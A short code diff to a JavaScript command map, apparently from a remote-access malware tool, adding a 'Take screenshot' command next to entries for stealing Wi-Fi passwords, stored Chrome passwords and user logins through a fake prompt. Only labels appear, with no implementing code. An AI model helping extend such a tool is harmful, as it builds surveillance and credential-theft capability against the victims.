@@ -17,6 +17,7 @@ const commands = {
     'upload':'Upload',
     'download':'Download',
     'change-image':'Change Background',
+    'capture':'Take screenshot',
     'getwifi':'Get Wifi Passwords',
     'webPass':'Get Stored Chrome Passwords',
     'PromptUser':'Prompt User UI Login',
